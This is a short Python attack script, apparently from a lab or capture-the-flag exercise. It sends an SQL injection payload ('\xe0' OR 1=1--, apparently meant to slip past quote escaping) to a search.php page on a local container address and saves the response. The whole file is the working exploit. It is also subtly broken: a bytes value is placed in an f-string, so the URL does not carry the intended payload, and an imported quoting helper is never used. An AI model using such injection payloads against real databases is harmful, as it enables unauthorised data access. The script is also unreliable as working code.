import requests

payload = "\xe0' OR 1=1--"
param = payload.encode("latin1")

# Manually build the full query string
from urllib.parse import quote_from_bytes

url = f"http://172.17.0.2/search.php?user={param}"

print("[DEBUG] Sending to:", url)
response = requests.get(url)

print(response.text)

with open("output.html", "w+") as outfile:
    outfile.write(response.text)